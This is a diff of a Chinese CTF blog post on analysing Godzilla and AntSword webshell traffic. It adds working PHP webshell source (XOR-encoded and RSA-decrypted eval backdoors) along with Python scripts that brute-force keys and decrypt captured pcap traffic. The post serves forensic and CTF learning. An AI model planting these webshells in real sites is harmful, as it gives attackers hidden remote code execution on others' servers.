@@ -383,20 +383,237 @@ Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzi
 
 ### 哥斯拉流量分析
 
+考链接：[https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/](https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/)
+
 &gt; 哥斯拉的默认密钥为：3c6e0b8a9c15224a
 
 哥斯拉流量一般的加密方式就是异或，当然在插件的加持下可能也会用到AES
 
-然后如果是异或的话，编码器的函数如下所示，就是这里要注意把密钥的最后一位放到最后
+我们以下面这个编码器为例子，这里要注意异或的时候，是从密钥的第二位开始异或
+
+因此当我们使用CyberChef解密的时候，需要把密钥的第一位移到最后
 
 ```php
 function encode($D,$K){
     for($i=0;$i&lt;strlen($D);$i&#43;&#43;) {
-        $c = $K[$i&#43;1&amp;15]; // 要注意把密钥的最后一位放到最后
+        $c = $K[$i&#43;1&amp;15];
         $D[$i] = $D[$i]^$c;
     }
     return $D;
 }
+```
+
+一般简单的哥斯拉流量的题目，知道上面这个就能够解密了
+
+当然，也会有题目会考察选手对哥斯拉细节的理解
+
+因此我们就拿下面这个哥斯拉的Webshell为例子，深入分析一下哥斯拉流量的加密流程
+
+```php
+&lt;?php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+
+// 编码器
+function encode($D,$K){
+    for($i=0;$i&lt;strlen($D);$i&#43;&#43;) {
+        $c = $K[$i&#43;1&amp;15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+
+$pass=&#39;babyshell&#39;; // 哥斯拉的连接密码
+$payloadName=&#39;payload&#39;;
+$key=&#39;421eb7f1b8e4b3cf&#39;;// 哥斯拉流量的解密密钥
+
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+        if (strpos($payload,&#34;getBasicsInfo&#34;)===false){
+            $payload=encode($payload,$key);
+        }
+    		eval($payload);
+        echo substr(md5($pass.$key),0,16); // 输出MD5(连接密码&#43;流量解密密钥)的前16位
+        echo base64_encode(encode(@run($data),$key));
+        echo substr(md5($pass.$key),16); // 输出MD5(连接密码&#43;流量解密密钥)的后16位
+    }else{
+        if (strpos($data,&#34;getBasicsInfo&#34;)!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
+        }
+    }
+}
+?&gt;
+```
+
+仔细观察上面的Webshell源码，关键部分我已经写上了对应的注释
+
+哥斯拉流量解密的关键就在于`$key`这个密钥上，假如这个密钥未知，我们有什么办法去得到它呢
+
+第一种最简单方法就是看看流量中有没有上传Webshell的源码，如果有，可以从源码中获得
+
+第二种方法是我们可以结合请求和响应包中的数据，尝试去爆破这个解密密钥
+
+这种方法就考察了哥斯拉流量的加密流程，因此我们需要去逆向分析一下这个密钥是如何生成的
+
+Github上有开源的逆向后的源码：[https://github.com/Freakboy/Godzilla](https://github.com/Freakboy/Godzilla)
+
+其中，我们主要关注下面这段代码
+
+```java
+public byte[] generate(String password, String secretKey) {
+    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
+}
+```
+
+我们可以发现，哥斯拉的流量解密密钥是明文密钥MD5的前十六位，而这个明文密钥一般是可读的字符串
+
+然后结合响应包中，会输出输出MD5(连接密码&#43;流量解密密钥)的值
+
+```php
+eval($payload);
+echo substr(md5($pass.$key),0,16); // 输出MD5(连接密码&#43;流量解密密钥)的前16位
+echo base64_encode(encode(@run($data),$key));
+echo substr(md5($pass.$key),16); // 输出MD5(连接密码&#43;流量解密密钥)的后16位
+```
+
+因为连接密码可以从请求包中得到，就是请求包中POST传参的参数
+
+因此，我们就可以尝试写一个脚本去爆破密钥
+
+```python
+import hashlib
+
+
+def md5_encode(text):
+    return hashlib.md5(text.encode(&#39;utf-8&#39;)).hexdigest()
+
+def crack_key(key_list,target_hash):
+    pwd = &#34;Antsword&#34; # 哥斯拉的连接密码
+    for key in key_list:
+        tmp = md5_encode(key) # 明文密钥的MD5
+        tmp_hash = md5_encode(pwd&#43;tmp[:16]) # 响应中返回的hash
+        if tmp_hash == target_hash:
+            print(f&#34;[&#43;] 密钥爆破成功: {key}&#34;)
+            print(f&#34;[&#43;] 用于解密哥斯拉流量的密钥为 {tmp[:16]}&#34;)
+    return key
+
+if __name__ == &#39;__main__&#39;:
+    # 响应中返回的hash
+    target_hash = &#34;e71f50e9773b23f9792dea3a7ae385ca&#34;
+    with open(&#34;dic.txt&#34;,&#39;r&#39;) as f:
+        key_list = f.read().split()
+    crack_key(key_list, target_hash)
+
+# [&#43;] 密钥爆破成功: Antsw0rd
+# [&#43;] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e
+```
+
+当然也可以直接用CTF-NetA爆破
+
+![](imgs/image-20250515121809838.png)
+
+例题1-2024福建省数据安全大赛-gza_Cracker
+
+例题2-2020HITCTF-Traffic
+
+附：哥斯拉密钥爆破&#43;流量批量解密脚本
+
+```python
+import re
+import io
+import gzip
+import json
+import base64
+import hashlib
+import subprocess
+import urllib.parse
+
+
+def url_decode(encoded_str):
+    return urllib.parse.unquote(encoded_str)
+
+def xor_decode(data: bytes, key: bytes) -&gt; bytes:
+    result = bytearray()
+    for i in range(len(data)):
+        c = key[(i &#43; 1) &amp; 15]
+        result.append(data[i] ^ c)
+    return bytes(result)
+
+def gunzip_bytes(compressed_data: bytes) -&gt; bytes:
+    with gzip.GzipFile(fileobj=io.BytesIO(compressed_data)) as f:
+        return f.read()
+
+def decrypt_traffic(filename,key):
+    http_data = []
+    command = [
+        &#34;tshark&#34;,  # tshark的路径，如果在环境变量里这里就不用改
+        &#39;-r&#39;, filename,  # 读取指定的 pcapng 文件
+        &#39;-Y&#39;, &#39;http&#39;,  # 过滤出 HTTP 数据包
+        &#39;-T&#39;, &#39;json&#39;,  # 输出为 JSON 格式
+        &#39;-e&#39;, &#39;http.file_data&#39;,  # 请求中的文件数据（POST 请求的内容）
+        &#39;-e&#39;, &#39;http.response.phrase&#39;,  # 响应短语
+        &#39;-e&#39;, &#39;http.content_type&#39;  # 响应内容类型
+    ]
+    result = subprocess.run(
+        command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    json_output = json.loads(result.stdout)
+    # print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除
+
+    # 遍历 JSON 数据并提取字段
+    for packet in json_output:
+        layers = packet.get(&#39;_source&#39;, {}).get(&#39;layers&#39;, {})
+        request_method = layers.get(&#39;http.request.method&#39;, [&#39;None&#39;])[0]
+        response_code = layers.get(&#39;http.response.code&#39;, [&#39;None&#39;])[0]
+        file_data = layers.get(&#39;http.file_data&#39;, [&#39;None&#39;])[0]
+        try:
+            http_data.append(url_decode(bytes.fromhex(file_data).decode(&#39;utf-8&#39;)))
+        except:
+            pass
+    for item in http_data:
+        # print(item)
+        if &#34;Antsword=&#34; in item:
+            try:
+                enc = re.findall(r&#34;Antsword=(.*)&#34;,item)[0]
+                # print(enc)
+                dec = xor_decode(base64.b64decode(enc),key.encode(&#39;utf-8&#39;))
+                dec = gunzip_bytes(dec).decode(&#39;utf-8&#39;,errors=&#39;ignore&#39;)
+                print(f&#34;[&#43;] 请求: {dec}&#34;)
+            except:
+                pass
+        if &#34;e71f50e9773b23f9&#34; in item:
+            try:
+                enc = re.findall(r&#34;e71f50e9773b23f9(.*)792dea3a7ae385ca&#34;,item)[0]
+                dec = xor_decode(base64.b64decode(enc),key.encode(&#39;utf-8&#39;))
+                dec = gunzip_bytes(dec).decode(&#39;utf-8&#39;,errors=&#39;ignore&#39;)
+                print(f&#34;[&#43;] 响应: {dec}&#34;)
+            except:
+                pass
+
+def md5_encode(text):
+    return hashlib.md5(text.encode(&#39;utf-8&#39;)).hexdigest()
+
+def crack_key(key_list,target_hash):
+    pwd = &#34;Antsword&#34; # 哥斯拉的连接密码
+    for key in key_list:
+        tmp = md5_encode(key) # 明文密钥的MD5
+        tmp_hash = md5_encode(pwd&#43;tmp[:16]) # 响应中返回的hash
+        if tmp_hash == target_hash:
+            print(f&#34;[&#43;] 密钥爆破成功: {key}&#34;)
+            print(f&#34;[&#43;] 用于解密哥斯拉流量的密钥为 {tmp[:16]}&#34;)
+    return key
+
+if __name__ == &#39;__main__&#39;:
+    # 响应中返回的hash
+    # target_hash = &#34;e71f50e9773b23f9792dea3a7ae385ca&#34;
+    # with open(&#34;dic.txt&#34;,&#39;r&#39;) as f:
+        # key_list = f.read().split()
+    # crack_key(key_list, target_hash)
+    # [&#43;] 密钥爆破成功: Antsw0rd
+    # [&#43;] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e
+    decrypt_traffic(&#39;Crack_me.pcap&#39;,&#39;a18551e65c48f51e&#39;)
 ```
 
 #### php_xor_raw
@@ -553,19 +770,21 @@ def decrypt_aes_cbc(ciphertext_base64):
 
 ### 蚁剑流量分析
 
-蚁剑流量因为支持多种编码器，然后Github上也有很多[开源的编码器]()
+蚁剑支持多种编码器，然后Github上也有很多[开源的编码器](https://goodlunatic.github.io/posts/5422d65/#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90)
 
-&gt; 1、 https://github.com/lowliness9/AntSwordEncoder
-&gt; 
-&gt; 2、 https://github.com/AntSwordProject/AwesomeEncoder
+1、 [https://github.com/lowliness9/AntSwordEncoder](https://github.com/lowliness9/AntSwordEncoder)
+
+2、 [https://github.com/AntSwordProject/AwesomeEncoder](https://github.com/AntSwordProject/AwesomeEncoder)
 
 因此流量的分析和解密上就会稍微复杂一点
 
 这里我稍微写一下蚁剑流量分析需要注意的地方：
 
-1、路径base64字符串需要去除前两个字符后再解码
-
-2、响应数据的头尾有额外的字符，需要先去除然后再base64解码
+&gt; 0、首先需要判断出攻击者用的是什么编码器
+&gt; 
+&gt; 1、路径base64字符串需要去除前两个字符后再解码
+&gt; 
+&gt; 2、响应数据的头尾有额外的字符，需要先去除然后再base64解码
 
 ```php
 // 蚁剑webshell一个比较简单的例子
@@ -659,27 +878,44 @@ die();
 ?&gt;
 ```
 
-这里总结一下我手动分析蚁剑流量的步骤：
+#### Reverse
 
-1、首先url解码请求包，然后base64解码其中的php文件和该文件执行的命令
+#### ROT13
 
-2、找到php文件中asoutput函数的标识字符串
+#### RSA
 
 ```php
-function asoutput()
-{
-    $output = ob_get_contents(); // 获取输出缓冲区内容
-    ob_end_clean(); // 清空输出缓冲区
-    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
-    echo &#34;fb708664&#34;;
-    echo @asenc($output);
-    echo &#34;870b983ed5&#34;;
+&lt;?php
+$cmd = @$_POST[&#39;ant&#39;];
+$pk = &lt;&lt;&lt;EOF
+-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ&#43;QlYywklwVcx
+PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw&#43;l8qILYezVtxmUePQ
+5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV&#43;re4j&#43;t2tKF3NhnyOtbd1J
+RAcfJSQCvaw6O8uq3wIDAQAB
+-----END PUBLIC KEY-----
+EOF;
+$cmds = explode(&#34;|&#34;, $cmd);
+$pk = openssl_pkey_get_public($pk);
+$cmd = &#39;&#39;;
+foreach ($cmds as $value) {
+  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
+    $cmd .= $de;
+  }
 }
+foreach($_POST as $k =&gt; $v){
+    if (openssl_public_decrypt(base64_decode($v), $de, $pk)) {
+       $_POST[$k]=$de;
+  }
+}
+eval($cmd);
 ```
 
-3、根据gzip的文件头提取响应包，去除标识字符串后base64解码得到响应数据
+可以直接用CTF-NetA一把梭
 
-4、按照上面的步骤逐个分析流量包
+![](imgs/image-20250515121850746.png)
+
+![](imgs/image-20250515121856215.png)
 
 ### CobalStrike流量分析
 
@@ -1476,5 +1712,5 @@ with open(&#34;tshark.txt&#34;) as f:
 ---
 
 > Author: [Lunatic](https://goodlunatic.github.io)  
-> URL: http://localhost:1313/posts/5422d65/  
+> URL: https://goodlunatic.github.io/posts/5422d65/  
 
